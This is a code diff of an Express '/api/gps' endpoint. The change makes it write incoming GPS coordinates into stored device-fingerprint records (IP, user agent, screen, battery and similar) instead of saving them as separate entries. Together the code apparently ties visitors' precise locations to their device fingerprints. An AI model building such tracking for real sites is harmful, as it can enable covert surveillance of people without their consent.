@@ -328,7 +328,6 @@ app.post('/api/gps', (req, res) => {
   const { latitude, longitude, accuracy, speed, altitude, heading } = req.body;
   if (!latitude || !longitude) return res.json({ success: false });
 
-  const id = Date.now().toString();
   const now = new Date().toLocaleString('en-US', { timeZone: 'Asia/Baghdad' });
 
   console.log('GPS Data:', latitude, longitude, '±' + accuracy + 'm');
@@ -360,20 +359,19 @@ app.post('/api/gps', (req, res) => {
     });
   }
 
-  saveDevice({
-    id: 'gps_' + id, deviceHash: 'gps-' + id, ip: getIP(req),
-    deviceModel: 'GPS Location',
-    latitude: parseFloat(latitude), longitude: parseFloat(longitude),
-    accuracy: accuracy ? Math.round(parseFloat(accuracy)) : null,
-    speed: speed || null, altitude: altitude || null, heading: heading || null,
-    deviceType: null, os: null, browser: null,
-    connectionType: null, battery: null, batteryCharging: null,
-    screen: null, availScreen: null, windowSize: null,
-    colorDepth: null, pixelRatio: null, touchPoints: null,
-    orientation: null, vendor: null, language: null, languages: null,
-    platform: null, cores: 0, memory: 0, timezone: null, ua: null,
-    appVersion: null, timestamp: now, timeISO: new Date().toISOString()
-  });
+  const devices = readDevices();
+  for (let i = devices.length - 1; i >= 0; i--) {
+    if (devices[i].deviceHash && !devices[i].latitude) {
+      devices[i].latitude = parseFloat(latitude);
+      devices[i].longitude = parseFloat(longitude);
+      devices[i].accuracy = accuracy ? Math.round(parseFloat(accuracy)) : null;
+      devices[i].speed = speed || null;
+      devices[i].altitude = altitude || null;
+      devices[i].heading = heading || null;
+      fs.writeFileSync(DEVICES_FILE, JSON.stringify(devices, null, 2));
+      break;
+    }
+  }
 
   res.json({ success: true });
 });
